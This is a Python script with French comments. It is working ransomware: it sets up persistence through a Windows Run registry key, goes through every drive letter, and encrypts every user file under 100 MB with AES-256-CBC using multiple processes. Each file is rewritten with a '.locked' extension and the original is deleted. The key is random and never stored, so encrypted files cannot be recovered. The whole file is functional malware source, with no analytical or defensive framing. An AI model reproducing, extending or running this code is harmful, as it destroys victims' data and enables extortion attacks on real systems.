import os
import string
from pathlib import Path
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path
import multiprocessing
import winreg

# Clé et IV pour AES-256 CBC
key = os.urandom(32)  # 256 bits
iv = os.urandom(16)   # 128 bits

# Extensions de fichiers à exclure
extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com",".locked")

# Dossiers à exclure (en minuscules)
folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode"
]

max_size = 100 * 1024 * 1024




def ajouter_run_key():
    try:
        nom_valeur = "MonScriptAuto"
        chemin_script = os.path.join(os.path.dirname(os.path.realpath(__file__)), "monScript.vbs")

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
        winreg.CloseKey(key)
        print("[+] Ajouté au démarrage avec Run Key.")
    except Exception as e:
        print(f"[!] Erreur ajout Run Key : {e}")


def is_in_excluded_folder(file_path: Path):
    try:
        # Normalise le chemin et récupère les parties du chemin
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"[!] Erreur exclusion sur {file_path}: {e}")
        return True  
        

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths


def encrypte_file(input_file):
    backend = default_backend()

    with open(input_file, 'rb') as f:
        data = f.read()

    # Ajout de padding pour aligner les blocs AES (128 bits)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Création du cipher AES CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Fichier de sortie
    output_file = input_file + ".locked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)  # on stocke IV au début

    os.remove(input_file)
    print(f"[✓] Fichier chiffré : {input_file}")
    return True


def search_file(base_path):
    base_path = Path(base_path)
    for file in base_path.rglob("*"):
        try:
            if is_in_excluded_folder(file):
                continue

            if file.is_file() and not file.suffix.lower() in extensions_exclues:
                if file.stat().st_size < max_size:
                    encrypte_file(str(file))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")
    return True

# --- Ajout pour multi-processing sur un même lecteur ---

def diviser_liste(lst, n):
    # Si la liste est vide, on retourne n listes vides
    if len(lst) == 0:
        return [[] for _ in range(n)]
    longueur = len(lst)

    # Taille de chaque sous-liste (arrondi vers le haut pour ne rien perdre)
    taille = (longueur + n - 1) // n

    result = []

    for i in range(n):
        debut = i * taille
        fin = debut + taille
        # On ajoute la tranche correspondante à la sous-liste
        result.append(lst[debut:fin])

    return result


def chiffrer_liste_fichiers(fichiers):
    for file in fichiers:
        try:
            if is_in_excluded_folder(file):
                continue
            if file.is_file() and file.suffix.lower() not in extensions_exclues and file.stat().st_size < max_size:
                encrypte_file(str(file))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")


def process_par_lecteur(chemin, nb_process=5):
    chemin = Path(chemin)
    fichiers = list(chemin.rglob("*"))
    sous_listes = diviser_liste(fichiers, nb_process)

    processus = []
    for sous_liste in sous_listes:
        p = multiprocessing.Process(target=chiffrer_liste_fichiers, args=(sous_liste,))
        p.start()
        processus.append(p)

    for p in processus:
        p.join()

def main():
    ajouter_run_key()
    lecteurs = get_existing_root_path()
    processus_lecteurs = []

    for lecteur in lecteurs:
        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur,))
        p.start()
        processus_lecteurs.append(p)

    for p in processus_lecteurs:
        p.join()


if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()